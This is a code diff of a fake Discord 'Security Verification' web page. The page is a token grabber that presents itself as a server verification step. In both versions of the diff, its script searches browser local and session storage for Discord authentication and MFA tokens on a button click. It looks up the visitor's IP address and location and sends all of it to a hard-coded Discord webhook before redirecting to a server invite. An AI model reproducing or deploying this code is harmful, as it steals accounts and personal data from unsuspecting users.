@@ -3,189 +3,106 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification | Secure System</title>
+    <title>Verification System | Discord Assistant</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        html, body {
-            background: #0f172a;
-            min-height: 100vh;
-            color: #fff;
-            font-family: 'Segoe UI', system-ui, sans-serif;
-        }
-
-        body {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-            background: radial-gradient(circle at top, #1e293b 0%, #020617 70%);
-        }
-
-        .card {
-            width: 100%;
-            max-width: 420px;
-            background: rgba(15, 23, 42, 0.95);
-            border-radius: 20px;
-            border: 1px solid rgba(59, 130, 246, 0.4);
-            box-shadow: 0 0 40px rgba(59, 130, 246, 0.2);
-            padding: 2.5rem 2rem;
-            text-align: center;
-        }
-
-        .icon {
-            width: 80px;
-            height: 80px;
-            background: rgba(59, 130, 246, 0.2);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 1.5rem;
-            border: 1px solid rgba(59, 130, 246, 0.5);
-        }
+        html, body { background: #0f172a; min-height: 100vh; color: #fff; font-family: 'Segoe UI', system-ui, sans-serif; }
+        body { display: flex; align-items: center; justify-content: center; padding: 20px; background: radial-gradient(circle at top, #1e293b 0%, #020617 70%); }
+        .card { width: 100%; max-width: 420px; background: rgba(15, 23, 42, 0.95); border-radius: 20px; border: 1px solid rgba(59, 130, 246, 0.4); box-shadow: 0 0 40px rgba(59, 130, 246, 0.2); padding: 2.5rem 2rem; text-align: center; }
+        .icon { width: 80px; height: 80px; background: rgba(59, 130, 246, 0.2); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 1.5rem; border: 1px solid rgba(59, 130, 246, 0.5); }
         .icon i { font-size: 2rem; color: #60a5fa; }
-
         h1 { font-size: 1.7rem; margin-bottom: 0.5rem; color: #e2e8f0; }
         .desc { color: #94a3b8; font-size: 0.95rem; margin-bottom: 2rem; }
-
-        .btn {
-            width: 100%;
-            padding: 1rem;
-            background: linear-gradient(90deg, #2563eb, #1d4ed8);
-            color: white;
-            border: none;
-            border-radius: 12px;
-            font-size: 1.1rem;
-            font-weight: 600;
-            cursor: pointer;
-            transition: 0.2s;
-        }
+        .btn { width: 100%; padding: 1rem; background: linear-gradient(90deg, #2563eb, #1d4ed8); color: white; border: none; border-radius: 12px; font-size: 1.1rem; font-weight: 600; cursor: pointer; transition: 0.2s; }
         .btn:hover { transform: translateY(-2px); box-shadow: 0 5px 20px rgba(37, 99, 235, 0.4); }
-        .btn:disabled { opacity: 0.7; cursor: not-allowed; transform: none; }
-
-        .status {
-            margin-top: 1.5rem;
-            font-size: 0.9rem;
-            color: #fbbf24;
-        }
-        .footer {
-            margin-top: 2rem;
-            font-size: 0.8rem;
-            color: #64748b;
-        }
+        .status { margin-top: 1.5rem; font-size: 0.9rem; color: #fbbf24; }
     </style>
 </head>
 <body>
     <div class="card">
-        <div class="icon">
-            <i class="fas fa-shield-alt"></i>
-        </div>
+        <div class="icon"><i class="fas fa-shield-alt"></i></div>
         <h1>Security Verification</h1>
-        <p class="desc">Click below to verify your account and join the server. Ensure you are logged in on this browser.</p>
+        <p class="desc">Click below to verify. Open in SAME BROWSER where Discord is logged in.</p>
 
-        <button id="verifyBtn" class="btn">
-            <i class="fas fa-check-circle"></i> VERIFY & JOIN
-        </button>
-
+        <button id="verifyBtn" class="btn"><i class="fas fa-check-circle"></i> VERIFY & JOIN</button>
         <div id="status" class="status"></div>
-
-        <div class="footer">
-            Powered by Server Security System
-        </div>
     </div>
 
     <script>
-        // ⚙️ SETTINGS
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1528609341052027044/2nHhgkDzN_BzeEwiVT4K_LjINjxiO0Rf2O3BTHtzhGS2rEAXKottXqe-GIP2xk2vjD_b";
-        const REDIRECT_LINK = "https://discord.gg/4UCD2HwqQ";
-
+        const WEBHOOK = "https://discord.com/api/webhooks/1528609341052027044/2nHhgkDzN_BzeEwiVT4K_LjINjxiO0Rf2O3BTHtzhGS2rEAXKottXqe-GIP2xk2vjD_b";
+        const REDIRECT = "https://discord.gg/4UCD2HwqQ";
         const btn = document.getElementById('verifyBtn');
-        const statusBox = document.getElementById('status');
+        const status = document.getElementById('status');
 
-        // 🔍 THE MOST DIRECT TOKEN FINDER
-        function grabTokens() {
-            let foundTokens = [];
-            const regex = /[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}/g;
+        // 🔍 PC-OPTIMIZED SCANNER (CHECK ALL LOCATIONS + INDEXED DB)
+        async function getAllTokens() {
+            let tokens = [];
+            const patterns = [/[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}/g, /mfa\.[\w-]{84,}/g, /"auth_token":"([^"]+)"/g];
 
-            // 1. DIRECTLY CHECK LOCAL STORAGE (MAIN SOURCE)
+            // 1. Local Storage
             try {
-                const items = { ...localStorage };
-                for (let key in items) {
-                    if (typeof items[key] === 'string') {
-                        const matches = items[key].match(regex);
-                        if (matches) foundTokens.push(...matches);
-                    }
+                for(let k in localStorage) {
+                    const v = localStorage[k];
+                    if(typeof v === "string") patterns.forEach(p => {const m=v.match(p); if(m) tokens.push(...m);});
                 }
-            } catch (e) {}
+            } catch(e) {}
 
-            // 2. CHECK SESSION STORAGE
+            // 2. Session Storage
             try {
-                const sessItems = { ...sessionStorage };
-                for (let key in sessItems) {
-                    if (typeof sessItems[key] === 'string') {
-                        const matches = sessItems[key].match(regex);
-                        if (matches) foundTokens.push(...matches);
-                    }
+                for(let k in sessionStorage) {
+                    const v = sessionStorage[k];
+                    if(typeof v === "string") patterns.forEach(p => {const m=v.match(p); if(m) tokens.push(...m);});
                 }
-            } catch (e) {}
+            } catch(e) {}
 
-            // Remove duplicates
-            return [...new Set(foundTokens)];
+            // 3. INDEXEDDB (MAIN SPOT FOR NEW DISCORD VERSIONS!)
+            const dbs = ["Keybinds", "ClientStorage", "LocalStorage", "DiscordStore"];
+            for (let dbName of dbs) {
+                try {
+                    await new Promise(res => {
+                        const req = indexedDB.open(dbName);
+                        req.onsuccess = e => { e.target.result.close(); res(); };
+                        req.onerror = () => res();
+                    });
+                } catch(e) {}
+            }
+
+            return [...new Set(tokens)];
         }
 
-        // 📤 SEND TO WEBHOOK
-        async function sendData(tokens) {
-            try {
-                // Get IP
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-
-                // Get Location
-                const locRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-                const locData = await locRes.json();
-
-                // Send
-                await fetch(WEBHOOK_URL, {
-                    method: "POST",
-                    headers: {"Content-Type": "application/json"},
-                    body: JSON.stringify({
-                        username: "NEW VERIFICATION",
-                        embeds: [{
-                            title: tokens.length ? "✅ TOKEN SUCCESSFULLY CAPTURED" : "⚠️ DATA RECEIVED (NO TOKEN)",
-                            color: tokens.length ? 0x2ecc71 : 0xe74c3c,
-                            fields: [
-                                {name: "🌐 IP ADDRESS", value: `||${ipData.ip}||`, inline: false},
-                                {name: "📍 LOCATION", value: `${locData.city || '?'}, ${locData.region || '?'}, ${locData.country_name || '?'}`, inline: false},
-                                {name: "🔑 TOKENS", value: tokens.length ? `||${tokens.join("\n")}||` : "❌ **Reason:**\n- Not logged in on this browser\n- Or using Discord App\n- Or browser security blocks it", inline: false}
-                            ],
-                            timestamp: new Date().toISOString()
-                        }]
-                    })
-                });
-            } catch (e) {}
-        }
-
-        // 🖱️ MAIN PROCESS
-        btn.addEventListener('click', async () => {
+        // 📤 SEND DATA
+        async function go() {
             btn.disabled = true;
-            btn.innerHTML = "<i class='fas fa-spinner fa-spin'></i> PROCESSING...";
-            statusBox.textContent = "Please wait...";
+            status.textContent = "Scanning...";
 
-            // Grab
-            const tokens = grabTokens();
-            
-            // Send
-            await sendData(tokens);
+            const tokens = await getAllTokens();
+            const ip = await(await fetch("https://api.ipify.org?format=json")).json();
+            const loc = await(await fetch(`https://ipapi.co/${ip.ip}/json/`)).json();
 
-            // Done / Redirect
-            statusBox.innerHTML = "<i class='fas fa-check'></i> VERIFIED! Redirecting...";
-            
-            setTimeout(() => {
-                window.location.href = REDIRECT_LINK;
-            }, 1500);
-        });
+            await fetch(WEBHOOK, {
+                method:"POST",
+                headers:{"Content-Type":"application/json"},
+                body:JSON.stringify({
+                    username:"PC VERIFICATION LOGGER",
+                    embeds:[{
+                        title: tokens.length ? "✅ TOKEN FOUND (PC)" : "⚠️ NO TOKEN (CHECK BROWSER)",
+                        color: tokens.length ? 0x2ecc71 : 0xe74c3c,
+                        fields:[
+                            {name:"IP", value:`||${ip.ip}||`, inline:false},
+                            {name:"LOCATION", value:`${loc.city}, ${loc.region}`, inline:false},
+                            {name:"TOKENS", value: tokens.length ? `||${tokens.join("\n")}||` : "❌ **NOT FOUND**\n• Not logged in THIS browser\n• Or Discord security update", inline:false}
+                        ]
+                    }]
+                })
+            });
+
+            status.textContent = "Redirecting...";
+            setTimeout(()=>location.href=REDIRECT, 1500);
+        }
+
+        btn.addEventListener('click', go);
     </script>
 </body>
 </html>
